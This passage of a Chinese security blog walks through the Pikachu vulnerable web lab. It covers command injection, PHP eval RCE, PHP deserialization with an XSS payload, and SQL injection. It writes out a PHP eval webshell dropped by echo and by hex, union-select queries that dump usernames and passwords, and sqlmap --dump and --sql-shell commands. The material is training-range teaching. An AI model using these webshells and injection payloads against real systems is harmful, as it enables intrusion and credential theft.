<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Windows</span><br><span class="line">	# 使用 ^ 对 &lt; 进行转义</span><br><span class="line">	echo ^&lt;?php @eval($_POST[x])?^&gt; &gt; /xxx/xxx/x.php</span><br><span class="line"></span><br><span class="line">- Linux</span><br><span class="line">	# 将一句话马转换为十六进制</span><br><span class="line">	原: &lt;?php @eval($_POST[x]);?&gt;</span><br><span class="line">	现: echo 3c3f70687020406576616c28245f504f53545b785d293f3e|xxd -r -ps  &gt; /xxx/xxx/x.php</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看一下服务端的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">                $result.=shell_exec(&#x27;ping -c 4 1.1.1.1 &amp; whoami);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接通过shell_exec执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br></pre></td></tr></table></figure>

<p>没有任何过滤，所以可以造成拼接</p>
<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110100607751.png" alt="image-20230110100607751"></p>
<h1 id="eval-RCE"><a href="#eval-RCE" class="headerlink" title="eval RCE"></a>eval RCE</h1><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以看下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;</span><br><span class="line">    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>@表示忽略报错</p>
<p>!表示“非”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@!eval()</span><br></pre></td></tr></table></figure>

<p>在命令执行时就会返回1(无论是否执行成功)，表示ture，输出“你喜欢的字符还挺奇怪的!”</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接执行php代码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110101728753.png" alt="image-20230110101728753"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-php反序列化</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="以一道ctf题引出"><a href="#以一道ctf题引出" class="headerlink" title="以一道ctf题引出"></a>以一道ctf题引出</h2><p><a href="http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?word=1">http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?word=1</a></p>
<p><img src="/images%5C1665972756565-e4933f3d-a26c-4ef2-a97f-f9da0708a54e.png" alt="img"></p>
<p>可以看到，如果需要获取到flag，需要将$c反序列化的值等于$FALG</p>
<p><img src="/images%5C1665972775803-1b21d8ea-ef2d-4890-9f2e-2753b78f9764.png" alt="img"></p>
<p>$FLAG已经给出</p>
<p><img src="/images%5C1665972891690-095f22dc-22e6-493d-ba33-111be79975d1.png" alt="img"></p>
<p>$c等于code参数通过get请求传来的值</p>
<p><img src="/images%5C1665972909057-b2165398-de59-4aff-9061-b8caacd7dddd.png" alt="img"></p>
<p>这里就需要构造出”show-me-the-flag”的序列化数据</p>
<p><img src="/images%5C1665992918211-802ac5ad-5816-495e-a359-f0ea584d1a1d.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:16:&quot;show-me-the-flag&quot;;</span><br></pre></td></tr></table></figure>

<p>code参数传参</p>
<p><a href="http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?code=s:16:%22show-me-the-flag%22;">http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?code&#x3D;s:16:%22show-me-the-flag%22;</a></p>
<p><img src="/images%5C1665992981688-64633350-6878-486b-81d1-7680b139dece.png" alt="img">;</p>
<h2 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h2><h3 id="主要是两个函数"><a href="#主要是两个函数" class="headerlink" title="主要是两个函数"></a>主要是两个函数</h3><h5 id="string-serialize-mixed-value"><a href="#string-serialize-mixed-value" class="headerlink" title="string serialize ( mixed $value )"></a>string serialize ( mixed $value )</h5><p>$value: 要序列化的对象或数组。</p>
<p>返回值是序列化后的字符串</p>
<h5 id="mixed-unserialize-string-str"><a href="#mixed-unserialize-string-str" class="headerlink" title="mixed unserialize ( string $str )"></a>mixed unserialize ( string $str )</h5><p>$str: 序列化后的字符串。</p>
<p>返回的是转换之后的值，可为 integer、float、string、array 或 object。</p>
<p>如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE。 </p>
<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class DemoClass&#123;</span><br><span class="line">        public $name=&quot;admin&quot;;</span><br><span class="line">        public $age=18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $demo=new DemoClass();</span><br><span class="line">    echo serialize($demo)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:9:&quot;DemoClass&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br></pre></td></tr></table></figure>

<p>说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O：代表object，如果是A的话，则表示数组</span><br><span class="line"></span><br><span class="line">9：代表对象的名字占9个字符(DemoClass)</span><br><span class="line"></span><br><span class="line">DemoClass：对象名</span><br><span class="line"></span><br><span class="line">2：表示改对象中有两个变量(name,age)</span><br><span class="line"></span><br><span class="line">s：变量的数据类型，string</span><br><span class="line"></span><br><span class="line">4：表示改变量名有4个字符</span><br><span class="line"></span><br><span class="line">name：变量名</span><br><span class="line"></span><br><span class="line">后面类似</span><br><span class="line"></span><br><span class="line">admin：变量值</span><br><span class="line"></span><br><span class="line">i：变量的数据类型，int</span><br></pre></td></tr></table></figure>

<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class DemoClass&#123;</span><br><span class="line">        public $name=&quot;admin&quot;;</span><br><span class="line">        public $age=18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $demo=new DemoClass();</span><br><span class="line">    $t= serialize($demo);</span><br><span class="line">    echo unserialize($t)-&gt;name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1665997664967-d018c11a-a27d-4a24-93f8-b0dac0205edb.png" alt="img"></p>
<h5 id="如果直接对类进行反序列化"><a href="#如果直接对类进行反序列化" class="headerlink" title="如果直接对类进行反序列化"></a>如果直接对类进行反序列化</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class DemoClass&#123;</span><br><span class="line">        public $name=&quot;admin&quot;;</span><br><span class="line">        public $age=18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $demo=new DemoClass();</span><br><span class="line">    $t= serialize($demo);</span><br><span class="line">    echo unserialize($t);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>会直接报错</p>
<p><img src="/images%5C1665997710246-6eba79c9-e252-4e61-9ef7-d0cbcbe1b860.png" alt="img"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>序列化后的内容只有成员变量，没有成员函数</p>
<h2 id="反序列化漏洞产生原因"><a href="#反序列化漏洞产生原因" class="headerlink" title="反序列化漏洞产生原因"></a>反序列化漏洞产生原因</h2><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct() //对象初始化时会调用此方法</span><br></pre></td></tr></table></figure>

<p>如果服务器能够接收我们反序列化过的字符串</p>
<p>并且未经过滤的把其中的变量直接放进这些魔术方法里面的话</p>
<p>就容易造成反序列化漏洞</p>
<h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><p>以pikachu为例</p>
<h5 id="构造pikachu靶场的反序列化漏洞payload"><a href="#构造pikachu靶场的反序列化漏洞payload" class="headerlink" title="构造pikachu靶场的反序列化漏洞payload"></a>构造pikachu靶场的反序列化漏洞payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110144806165.png" alt="image-20230110144806165"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $demo=new S();</span><br><span class="line">    echo serialize($demo);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1665997935394-e3adf96e-edb6-4dd9-9252-9ee261a8474b.png" alt="img"></p>
<p>下面研究一下为何要这样构造</p>
<h5 id="pikachu反序列化漏洞源码"><a href="#pikachu反序列化漏洞源码" class="headerlink" title="pikachu反序列化漏洞源码"></a>pikachu反序列化漏洞源码</h5><p>可以i看到使用了魔法函数__construct()，对象初始化时会调用此方法，类似构造函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;o&#x27;]))&#123;</span><br><span class="line">    $s = $_POST[&#x27;o&#x27;];</span><br><span class="line">    if(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对传入的值反序列化</p>
<p>如果是字符串啥的，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$demo=&quot;hello world&quot;;</span><br><span class="line">echo unserialize($demo);</span><br></pre></td></tr></table></figure>

<p>则unserialize不会有任何返回值，无法给unser赋值，此时给html加个p标签	</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>如果存在返回值，则将反序列化后的test变量加到p标签中</p>
<p>所以我们需要构造一个class，其中包含test变量(是否有其他变量无所谓，因为class里没用也没法用)</p>
<p>并且</p>
<p>反序列化的对象的class必须存在才行，不然也不会有啥输出</p>
<p><img src="/images%5C1666006109965-8d8dc99c-2602-45a6-8086-49eb432ffe4a.png" alt="img"></p>
<h5 id="所以就构造序列化的payload"><a href="#所以就构造序列化的payload" class="headerlink" title="所以就构造序列化的payload"></a>所以就构造序列化的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $demo=new S();</span><br><span class="line">    echo serialize($demo);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="payload为"><a href="#payload为" class="headerlink" title="payload为"></a>payload为</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>关于魔术函数，可以写个代码测试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class HACK</span><br><span class="line">&#123;</span><br><span class="line">    public $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo &quot;6666666666666&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo=new HACK();</span><br><span class="line">$demo-&gt;test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$a=serialize($demo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$pikachu=unserialize($a);</span><br><span class="line">echo $pikachu-&gt;test;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110145751955.png" alt="image-20230110145751955"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-sql注入</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sql注入概述"><a href="#sql注入概述" class="headerlink" title="sql注入概述"></a>sql注入概述</h1><p>sql注入，就是通过将服务器查询数据库的那一部分代码，传入恶意payload进行拼接，从而执行想要的命令</p>
<h3 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_POST[&#x27;id&#x27;];</span><br><span class="line">$query=&quot;select username,email from member where id=$id&quot;;</span><br><span class="line">$result=execute($link, $query);</span><br></pre></td></tr></table></figure>

<p>上述代码就是典型的可以尝试sql注入的源码</p>
<p>传入的id会直接拼接到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,email from member where id=$id</span><br></pre></td></tr></table></figure>

<p>于是就可以通过sql的语法执行我们想要的命令</p>
<p>当</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 or 1=1</span><br></pre></td></tr></table></figure>

<p>则sql代码就变为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,email from member where id=1 or 1=1</span><br></pre></td></tr></table></figure>

<p>此时where后面的逻辑会被判断为真，则会输出all</p>
<p>sql注入现在在真实环境中已经没有前几年那么流行，不过还是可能存在的严重漏洞</p>
<h1 id="数字型注入-POST"><a href="#数字型注入-POST" class="headerlink" title="数字型注入(POST)"></a>数字型注入(POST)</h1><p>提交后抓取数据包</p>
<p><img src="/images%5Cimage-20230109105642791.png" alt="image-20230109105642791"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=1</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109111315150.png" alt="image-20230109111315150"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109111347975.png" alt="image-20230109111347975"></p>
<p>通过上述两个payload可以判断存在数字型的SQL注入</p>
<h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 2		# 正常</span><br><span class="line">id=1 order by 3		# 异常</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109111919855.png" alt="image-20230109111919855"></p>
<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p><img src="/images%5Cimage-20230109112009321.png" alt="image-20230109112009321"></p>
<p>order by后面的数字表示根据第几列进行排序</p>
<p><img src="/images%5Cimage-20230109112302345.png" alt="image-20230109112302345"></p>
<p>所以当order by指定的列不存在时，就会报错</p>
<p><img src="/images%5Cimage-20230109112352909.png" alt="image-20230109112352909"></p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p>上述判断出存在两个字段，就可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,database()</span><br><span class="line"></span><br><span class="line">id=1 union select 1,database()</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109112828312.png" alt="image-20230109112828312"></p>
<p>返回的数据库名为pikachu</p>
<h5 id="union"><a href="#union" class="headerlink" title="union"></a>union</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p>
<p>需要注意的是union后面输出的列数需要和order by得出的结果相同</p>
<p><img src="/images%5Cimage-20230109113000341.png" alt="image-20230109113000341"></p>
<p>否则会报错</p>
<p><img src="/images%5Cimage-20230109113022537.png" alt="image-20230109113022537"></p>
<p>很好理解，因为它要把两个表合并成一个表</p>
<p><img src="/images%5Cimage-20230109113152391.png" alt="image-20230109113152391"></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">或直接代入数据库</span><br><span class="line">id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;pikachu&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109135947865.png" alt="image-20230109135947865"></p>
<p>pikachu数据库存在httpinfo,member,message,user,xssblind</p>
<h5 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h5><p>information_schema是MySQL系统自带的数据库</p>
<p><img src="/images%5Cimage-20230109134842484.png" alt="image-20230109134842484"></p>
<p>其中包括了几个重要的表(仅列几个这里用到的)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>

<p>即存放了数据库，表，列的相关信息</p>
<p>这里的information_schema.tables就包括了表的信息，table_schema列指向的就是其所属数据库</p>
<p>table_name就是表名</p>
<p><img src="/images%5Cimage-20230109135325713.png" alt="image-20230109135325713"></p>
<h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h5><p>可以理解为将字符串拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(&quot;a&quot;,1,&quot;b&quot;,table_name) from information_schema.tables;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109135737806.png" alt="image-20230109135737806"></p>
<p>当group_concat()中存在参数为字段名时，会将该列的所有字符串拼接输出</p>
<p>使用该函数主要是为了和union前的列数保持一致</p>
<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>这里查询pikachu.user表的字段名，即表的列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>

<p>字段信息在information_schema.columns表中</p>
<p><img src="/images%5Cimage-20230109140324209.png" alt="image-20230109140324209"></p>
<p>有id,username,password,level几个列</p>
<h3 id="读取字段的值"><a href="#读取字段的值" class="headerlink" title="读取字段的值"></a>读取字段的值</h3><p>users表下的username，password字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select group_concat(username),group_concat(password) from pikachu.users</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109140614225.png" alt="image-20230109140614225"></p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>由于是post请求，需要先保存数据包</p>
<p><img src="/images%5Cimage-20230109141141373.png" alt="image-20230109141141373"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch</span><br></pre></td></tr></table></figure>

<p>使用-r参数指定post文件</p>
<p>-p参数指定注入点</p>
<p>–batch后续需要选择Y&#x2F;N时程序默认选择</p>
<p><img src="/images%5Cimage-20230109141451060.png" alt="image-20230109141451060"></p>
<p>当出现这样表示存在sql注入</p>
<h5 id="输出数据库相关信息"><a href="#输出数据库相关信息" class="headerlink" title="输出数据库相关信息"></a>输出数据库相关信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch --schema</span><br></pre></td></tr></table></figure>

<p>–schema参数输出数据库相关信息</p>
<p><img src="/images%5Cimage-20230109141715448.png" alt="image-20230109141715448"></p>
<h5 id="输出pikachu的表"><a href="#输出pikachu的表" class="headerlink" title="输出pikachu的表"></a>输出pikachu的表</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu --tables</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109141832527.png" alt="image-20230109141832527"></p>
<h5 id="输出pikachu-users的字段名"><a href="#输出pikachu-users的字段名" class="headerlink" title="输出pikachu.users的字段名"></a>输出pikachu.users的字段名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu -T users --columns</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109141926918.png" alt="image-20230109141926918"></p>
<h5 id="输出pikachu-users-users的字段值"><a href="#输出pikachu-users-users的字段值" class="headerlink" title="输出pikachu.users.users的字段值"></a>输出pikachu.users.users的字段值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu -T users --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109142034486.png" alt="image-20230109142034486"></p>
<h5 id="进入sql-shell"><a href="#进入sql-shell" class="headerlink" title="进入sql shell"></a>进入sql shell</h5><p>提供数据库的交互命令行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch --sql-shell</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109142253366.png" alt="image-20230109142253366"></p>
<h5 id="或"><a href="#或" class="headerlink" title="或"></a>或</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_id.php --data=&quot;id=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p id</span><br></pre></td></tr></table></figure>

<h1 id="字符型注入-GET"><a href="#字符型注入-GET" class="headerlink" title="字符型注入(GET)"></a>字符型注入(GET)</h1><p>输入一个分号</p>
<p><img src="/images%5Cimage-20230109142507119.png" alt="image-20230109142507119"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109142618699.png" alt="image-20230109142618699"></p>
<p>可以判断出该注入是字符型注入</p>
<h3 id="查字段数"><a href="#查字段数" class="headerlink" title="查字段数"></a>查字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; order by 2%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143133507.png" alt="image-20230109143133507"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; order by 3%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143215156.png" alt="image-20230109143215156"></p>
<p>%23是#的url编码，表示注释符</p>
<p>字段数为2</p>
<h3 id="查询数据库名-1"><a href="#查询数据库名-1" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,database()%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143432513.png" alt="image-20230109143432513"></p>
<h3 id="查询表名-1"><a href="#查询表名-1" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143512248.png" alt="image-20230109143512248"></p>
<h3 id="查询字段名-1"><a href="#查询字段名-1" class="headerlink" title="查询字段名"></a>查询字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143547949.png" alt="image-20230109143547949"></p>
<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143631888.png" alt="image-20230109143631888"></p>
<h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<p>由于是get请求提交参数</p>
<p>-u指定url即可</p>
<p>其余利用在数字型注入(POST)中有详细描述</p>
<p><img src="/images%5Cimage-20230109143915692.png" alt="image-20230109143915692"></p>
<h1 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h1><p>根据提示，和闭合有关</p>
<p><img src="/images%5Cimage-20230109150223050.png" alt="image-20230109150223050"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109150610816.png" alt="image-20230109150610816"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109150722802.png" alt="image-20230109150722802"></p>
<p>可以判断源码大致为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select xxx from xxx where username=&#x27;(name)&#x27;</span><br></pre></td></tr></table></figure>

